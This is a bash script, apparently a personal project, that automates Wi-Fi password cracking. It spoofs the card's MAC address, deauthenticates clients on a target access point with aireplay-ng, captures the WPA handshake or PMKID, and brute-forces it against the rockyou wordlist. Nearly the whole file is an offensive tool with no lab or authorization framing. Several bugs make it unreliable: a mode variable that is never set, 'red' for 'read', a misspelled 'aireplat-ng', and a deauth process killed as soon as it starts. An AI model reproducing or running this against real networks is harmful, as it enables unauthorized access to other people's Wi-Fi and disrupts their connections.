#!/bin/bash

### WIFI CRACKER USING AIRCRACK-NG AND MACCHANGER ###
# Author: sporestudio

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purplecolor="\e[0;35m\033[1m"
turquoiseColour="\e[0;36\033[1m"
grayColour="\e[0;37m\033[1m"

# Exit function
trap ctrl_c INT

function ctrl_c() {
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Exiting...${endColour}"
	tput cnorm # Show the cursor again
	airmon-ng stop ${network_card}mon >/dev/null 2>&1
	rm -f screenshot* 2>/dev/null
	exit 0
}

# Function for the help panel
function helpPanel() {
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Use: :/sprwifi.sh${endColour}"
	echo -e "\n${grayColour}sprwifi - Next generation wifi cracker version 1.0${endColour}"
	echo -e "${grayColour}Developed by sporestudio${endColour}"
	echo -e "\n\n${purplecolor}${endColour}${grayColour}ATTACK MODE:${endColour}"
	echo -ne "\n ${grayColour}-a${endColour}${grayColour} Handshake:${endColour}"
	echo -ne "\t${grayColour}Captures the authentication message exchange between a client device and a Wi-Fi access point.${endColour}"
	echo -e "\n\t\t${grayColour}This exchange contains information that can be used to attempt to decrypt the network's security key.${endColour}"
	echo -ne "\n ${grayColour}-a${endColour}${grayColour} PKMID:${endColour}"
	echo -ne "\t${grayColour}PMKID mode (Pairwise Master Key Identifier), the attacker can capture the PMKID of a Wi-Fi access point${endColour}"
	echo -ne "\n\t\t${grayColour}without needing to capture a complete handshake. The PMKID is an identifier used in the authentication${endColour}"
	echo -e "\n\t\t${grayColour}process of WPA/WPA2-protected Wi-Fi networks.${endColour}"
	echo -e "\n\n${grayColour}NETWORK CARD NAME:${endColour}"
	echo -ne "\n ${grayColour}-n${endColour}${grayColour} <net_card>:${endColour}"
	echo -e "\t${grayColour}User network card name${endColour}"
	echo -e "\n\n${grayColour}HELP PANEL:${endColour}"
	echo -ne "\n ${grayColour}-h${endColour}${grayColour} Help panel:${endColour}"
	echo -e "\t${grayColour}Displays the help panel${endColour}"
	exit 0
}

# Verify if dependencies are installed
function dependencies() {
	tput civis # we can hide the cursor with this option
	clear
	dependencies=(aircrack-ng macchanger xterm)

	echo -e "${yellowColour}[*]${endColour}${grayColour}Checking necessary dependencies...${endColour}"
	sleep 2

	# loop that runs through each of the elements that we wnat to install
	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColor} Tool${endColour}${grayColour} $program${endColour}${blueColor}...${endColour}"

		# checking the status code of the program with test
		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e "${greenColour}(V)${endColour}"
		else
			echo -e "${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Installing tool $program...${endColour}"
			pacman -S --noconfirm $program >/dev/null 2>&1 # installing the program with non interactive mode
		fi
		sleep 1

	done
}

# Function to proceed with the attack mode
function startAttack() {
	if [ "$(echo $mode)" == "Handshake" ]; then
		clear
		echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring network card in monitor mode...${endColour}\n"
		airmon-ng start $network_card >/dev/null 2>&1                                        # Starting monitor mode
		ifconfig ${network_card}mon down && macchanger -a ${network_card}mon >/dev/null 2>&1 # We deregister teh network card and assign a random mac address
		ifconfig ${network_card}mon up
		killall dhclient wpa_supplicant 2>/dev/null 2>&1.0 # Here we re-discharge the card and kill the conflicting process

		echo -e "${yellowColour}[+]${endColour}${grayColour} New mac address: ${endColour}${grayColour}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"

		xterm -hold -e "airodump-ng ${network_card}mon" & # Starting aerodump in a new console , because this program works with stderr
		airodump_xterm_PID=$!                             # Catching the PID of the background process

		# Now ask to the user about the name of the access point and the channel
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access point's name: ${endColour}" && read apname
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access point's channel: ${endColour}" && red apchanel

		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apchanel -w screenshot --essid $apname ${network_card}mon" &
		airodump_filter_xterm_PID=$!

		sleep 5
		xterm -hold -e "aireplat-ng -0 10 -e $apname -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
		aireplay_xterm_PID=$!
		kill -9 $aireplay_xterm_PID
		wait $aireplay_xterm_PID 2>/dev/null

		sleep 10
		kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null

		# apply brute force to the hash obtained to crack the password with aircrack-ng
		xterm -hold -e "aircrack-ng -w /usr/share/wordlist/rockyou.txt screenshot-01.cap" &

	elif [ "$(echo $mode)" == "PKMID" ]; then
		clear
		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting ClientLess PKMID attack...${endColour}\n"
		sleep 2

		timeout 60 bash -c "hcxdumptool -i ${network_card}mon --enable_status=1 -o screenshot"
		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obtaining hashes...${endColour}\n"
		sleep 2
		hcxpcaptool -z myHashes screenshot
		rm screenshot 2>/dev/null

		test -f myHashes

	else
		echo -e "\n${redColour}[*] This attack mode is not valid ${endColour}"
		exit 1
	fi
}

## MAIN FUNCTION ##

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0
	while getopts ":a:n:h:" arg; do
		case $arg in
		a)
			attack_mode=$OPTARG
			let parameter_counter+=1
			;; # obtain the argument with the parameter -a
		n)
			network_card=$OPTARG
			let parameter_counter+=1
			;; # obtain the argument with -n
		h) helpPanel ;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm
		airmon-ng stop ${network_card}mon >/dev/null 2>&1
		rm -f screenshot* 2>/dev/null
	fi

else
	echo -e "\n${redColour}[*]I'm not root{endColour}\n"
	exit 2
fi
